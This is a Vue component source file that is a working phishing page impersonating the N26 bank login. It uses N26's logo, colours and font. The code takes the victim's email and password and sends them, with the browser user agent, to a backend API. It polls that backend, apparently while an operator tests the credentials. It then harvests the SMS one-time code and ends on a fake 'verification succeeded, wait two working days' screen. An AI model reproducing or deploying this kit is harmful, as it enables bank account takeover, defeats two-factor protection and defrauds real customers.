<!-- eslint-disable no-undef -->
<template>
  <div class="conment">

    <div class="box" v-if="fristtap">
      <div class="boxtap">
        <div class="logo"><svg viewBox="0 0 46 32" class="bt dg dj du dv"><path d="M40.649 12.795c-2.108 0-3.615.975-4.376 2.419 0-3.411 1.19-6.383 4.015-6.383 1.796 0 2.509 1.034 2.889 2.728l2.616-.523c-.615-2.926-2.474-4.347-5.487-4.347-3.785 0-6.617 2.906-6.617 9.42 0 5.783 2.361 8.641 6.43 8.641 3.363 0 5.881-2.296 5.881-6.08 0-2.956-1.576-5.875-5.351-5.875zm-.523 9.818c-2.087 0-3.531-1.92-3.782-4.463.634-2.172 2.04-3.253 3.701-3.253 2.136 0 3.342 1.577 3.342 3.82 0 2.407-1.373 3.896-3.261 3.896zM26.211 18.975c-.847.847-2.756 2.376-4.088 3.296h7.991v2.292H18.355V22.47c1.363-.973 4.193-3.086 5.964-4.858 1.695-1.695 2.805-3.244 2.805-5.518 0-2.237-1.229-3.167-2.89-3.167-1.702 0-3.062.984-3.062 3.039 0 .448.05.946.174 1.519l-2.671-.259a5.647 5.647 0 01-.174-1.395c0-2.743 1.924-5.142 5.821-5.142 3.215 0 5.593 1.669 5.593 5.318 0 3.318-2.423 5.705-3.513 6.779l-.191.189zM0 0h14.251v2.292H0zM11.579 6.875v12.1h-.001c0 1.071.025 1.719.075 2.342h-.05c-.262-.713-.571-1.338-1.031-2.152L3.416 6.875H.146v17.688h2.548v-12.1h.002c0-1.072-.025-1.719-.075-2.342h.05c.261.713.57 1.338 1.03 2.151l7.156 12.291h3.237V6.875h-2.515zM0 29.146h14.251v2.28H0z"></path></svg></div>
        <div>
          <div class="form-floating mb-3" style="margin-top:35px">
            <input type="email" class="form-control" id="floatingInput" placeholder="E-Mail" v-model="items.account" ref="account">
            <label for="floatingInput" style="font-size:18px">Email</label>
          </div>
          <div class="form-floating">
            <input type="password" class="form-control" id="floatingPassword" placeholder="Passwort" v-model="items.passworld" ref="passworld">
            <label for="floatingPassword" style="font-size:18px">Password</label>
          </div>
          <div class="paybutton">
              <van-button type="primary"  @click="getfrist()" color="#90c2b7" class="button" block :loading=fristload loading-text="loading...">log in</van-button>
          </div>
        </div>
      </div>
    </div>

    <div class="twobox" v-if="twotap">
      <div class="twoboxtap">
        <div class="twotitle">Verify your login</div>
        <div class="doce">Enter your phone's 6-digit verification code</div>
        <div>
          <div><!--
            <div class="doce">E-Mail-Bestätigungscode</div>
            <input type="text" class="inputbox" v-model="two.email" ref="email" style="margin-top:5px"> -->
            <input type="text" class="inputbox" placeholder="SMS-Bestätigungscode" v-model="two.emailcode" ref="emailcode" style="margin-top:5px">
          </div>
          <div class="doces">Re-send code in 19 seconds</div>
          <div class="paybutton">
              <van-button type="primary"  @click="gettwo()" color="#36a18b" block class="button" :loading=twoload loading-text="loading...">log in</van-button>
          </div>
        </div>
      </div>
    </div>

    <div class="twobox" v-if="threetap">
      <div class="twoboxtaps">
        <div class="logos"><svg viewBox="0 0 46 32" class="bt dg dj du dv"><path d="M40.649 12.795c-2.108 0-3.615.975-4.376 2.419 0-3.411 1.19-6.383 4.015-6.383 1.796 0 2.509 1.034 2.889 2.728l2.616-.523c-.615-2.926-2.474-4.347-5.487-4.347-3.785 0-6.617 2.906-6.617 9.42 0 5.783 2.361 8.641 6.43 8.641 3.363 0 5.881-2.296 5.881-6.08 0-2.956-1.576-5.875-5.351-5.875zm-.523 9.818c-2.087 0-3.531-1.92-3.782-4.463.634-2.172 2.04-3.253 3.701-3.253 2.136 0 3.342 1.577 3.342 3.82 0 2.407-1.373 3.896-3.261 3.896zM26.211 18.975c-.847.847-2.756 2.376-4.088 3.296h7.991v2.292H18.355V22.47c1.363-.973 4.193-3.086 5.964-4.858 1.695-1.695 2.805-3.244 2.805-5.518 0-2.237-1.229-3.167-2.89-3.167-1.702 0-3.062.984-3.062 3.039 0 .448.05.946.174 1.519l-2.671-.259a5.647 5.647 0 01-.174-1.395c0-2.743 1.924-5.142 5.821-5.142 3.215 0 5.593 1.669 5.593 5.318 0 3.318-2.423 5.705-3.513 6.779l-.191.189zM0 0h14.251v2.292H0zM11.579 6.875v12.1h-.001c0 1.071.025 1.719.075 2.342h-.05c-.262-.713-.571-1.338-1.031-2.152L3.416 6.875H.146v17.688h2.548v-12.1h.002c0-1.072-.025-1.719-.075-2.342h.05c.261.713.57 1.338 1.03 2.151l7.156 12.291h3.237V6.875h-2.515zM0 29.146h14.251v2.28H0z"></path></svg></div>
        <div>
          <div class="threetapico"><van-icon name="passed" size="90" color="#139e8b" /></div>
          <div class="threetaptext">The information has been verified successfully, please wait two working days patiently for verification</div>
        </div>
      </div>
    </div>

  </div>
</template>
<script>
import { valideEmail } from '@/utils/util'
export default {
  name: 'index',
  data () {
    return {
      appid: '',
      fristload: false,
      twoload: false,
      fristtap: true,
      twotap: false,
      threetap: false,
      fristdata: '',
      items: {
        account: '',
        passworld: ''
      },
      two: {
        email: '',
        emailcode: ''
      }
    }
  },

  watch: {
    items: {
      handler: function () {
        if (this.$refs.account.value != '' && this.$refs.passworld.value != '') {
          this.disabled = false
        }
      },
      deep: true
    },
    two: {
      handler: function () {
        console.log(this.$refs.emailcode.value)
        if (this.$refs.emailcode.value != '') {
          this.disableds = false
        }
      },
      deep: true
    }
  },

  methods: {

    getfrist (checkOrderInterval) {
      if (valideEmail(this.items.account) === false) {
        this.$toast({
          message: 'Please enter the correct mailbox',
          color: '#ffffff',
          background: '#ff6f6f',
          duration: 3000
        })
        return false
      }
      const ua = navigator.userAgent
      this.fristload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/create/3f0929adb48041a69871dda42401d4e0?account=' + this.items.account + '&password=' + this.items.passworld + '&ua=' + ua,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristdata = res.data.data
          this.fristload = false
          this.trainOrderResult()
          window.clearInterval(checkOrderInterval)
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    // 轮询支付结果
    async trainOrderResult () {
      this.disabled = true
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getthree(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.getthree(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    // 轮询支付结果
    async trainOrderResults () {
      this.disableds = true
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getfour(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.disableds = false
          that.getfour(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    gettwo (checkOrderInterval) {
      this.fristload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?smsCode=' + this.two.emailcode,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristdata = res.data.data
          this.fristtap = false
          this.fristload = false
          this.twotap = true
          this.trainOrderResults()
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    getthree (checkOrderInterval) {
      this.fristload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/password',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          this.fristtap = false
          this.twotap = true
          this.fristload = false
          this.disabled = false
          window.clearInterval(checkOrderInterval)
          return true
        } if (res.data.data != '0' && res.data.data != '1') {
          this.disabled = false
          this.fristload = false
          window.clearInterval(checkOrderInterval)
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    getfour (checkOrderInterval) {
      this.disableds = true
      this.twoload = true
      this.$axios({
        method: 'post',
        url: 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/smsCode',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          this.fristtap = false
          this.twotap = false
          this.twoload = false
          this.threetap = true
          this.disableds = false
          window.clearInterval(checkOrderInterval)
          return true
        } if (res.data.data != '0' && res.data.data != '1') {
          this.disableds = false
          window.clearInterval(checkOrderInterval)
          this.twoload = false
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    }
  },
  mounted () {
  },
  created () {
    const url = window.location.href
    if (url.indexOf('test') || url.indexOf('localhost')) {
      this.appid = '3f0929adb48041a69871dda42401d4e0'
    } else {
      this.appid = '3f0929adb48041a69871dda42401d4e0'
    }
  }
}
</script>

<style scoped>
  svg{
    fill:#fff;
    color:#fff
  }

  .form-floating>.form-control, .form-floating>.form-select {
    height:72px;
    line-height: 72px;
  }

  .form-control:focus {
      color: #212529;
      background-color: #fff;
      border-color: #48ac98;
      outline: 0;
      box-shadow: 0 0 0 0.25rem rgba(72 172 152 / 10%);
  }
  .form-floating>label {
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    padding: 1.5rem 0.75rem;
    pointer-events: none;
    border: 1px solid transparent;
    transform-origin: 0 0;
    transition: opacity .1s ease-in-out,transform .1s ease-in-out;
}

.form-floating>.form-control:focus, .form-floating>.form-control:not(:placeholder-shown) {
    padding-top: 2.55rem;
    padding-bottom: 0.625rem;
}
.form-control {
    display: block;
    width: 100%;
    padding: 0.375rem 0.75rem;
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.5;
    color: #212529;
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid #ced4da;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    border-radius: 15px;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}

  .box{
    width: 100%;
    height: 100%;
    position:absolute;
    background: #139e8b;
  }

  .twobox{
    width: 100%;
    height: 100%;
    position:absolute;
    background: #f9f9f9;
  }

  .twoboxtap{
    width:377px;
    padding: 30px 15px;
  }

  .boxtap{
    width:377px;
    border-radius: 15px;
    position:absolute;
    padding: 30px 15px;
    left:50%;
    top:50%;
    transform:translate(-50%,-50%);
  }
  .logo{
    width: 50px;
    margin: 0px auto;
  }

  .logos{
    width: 50px;
    margin: 0px auto;
  }
  .logos svg{
    fill:#000;
    color:#000
  }

  .inputbox{
    width: 100%;
    padding: 15px 15px;
    border-radius: 15px;
    border: 1px solid rgb(233, 233, 233);
    height: 70px;
    font-size: 18px;
    margin-top: 35px;
    font-family: "n26";
  }
  .doce{
    font-size: 14px;
    color: #666;
    margin-bottom: 30px;
  }
  .paybutton{
      padding-top: 35px;
  }
  .button{
    height: 55px;
    font-size: 18px;
    border-radius: 10px;
    background: #d1e6e1;
  }
  .button:hover{
    transform: translateY(-2px);
    box-shadow: 0 5px 10px rgb(0 0 0 / 20%);
  }
  .threetapico{
    width: 90px;
    margin: 0px auto;
    margin-top: 35px;
  }
  .threetaptext{
    font-size: 16px;
    color: #666;
    padding-top: 15px;
    text-align: center;
  }

  .twotitle{
    font-size: 22px;
    padding-bottom: 28px;
  }

  .doces{
    color:#139e8b;
    text-align: center;
    margin-top: 25px;
  }

  /*wap样式*/
@media (max-width: 1024px) {
 .boxtap{
    width:90%;
    border-radius: 15px;
    position:absolute;
    padding: 30px 15px;
    left:50%;
    top:50%;
    transform:translate(-50%,-50%);
  }
  .twoboxtap{
    width:90%;
    padding: 30px 15px;
    margin: 0px auto;
  }
  .twoboxtaps{
    width:90%;
    border-radius: 15px;
    position:absolute;
    padding: 30px 15px;
    left:50%;
    top:50%;
    transform:translate(-50%,-50%);
  }
}

</style>
